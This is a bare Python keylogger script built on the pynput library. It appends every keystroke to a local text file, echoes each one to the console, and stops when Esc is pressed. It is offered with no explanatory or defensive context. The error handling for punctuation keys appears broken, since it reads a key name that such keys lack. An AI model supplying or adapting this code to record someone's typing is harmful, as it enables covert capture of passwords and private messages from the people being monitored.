import pynput
from pynput import keyboard

def on_press(key):
    try:
        with open("keylogs.txt", "a") as f:
            if key.char.isalnum():
                f.write(key.char)
                print(f"Logged: {key.char}")
            else:
                f.write(f"<{key.name}>")
                print(f"Logged: <{key.name}>")
    except AttributeError:
        with open("keylogs.txt", "a") as f:
            f.write(f"<{key.name}>")
            print(f"Logged: <{key.name}>")

def on_release(key):
    if key == keyboard.Key.esc:
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()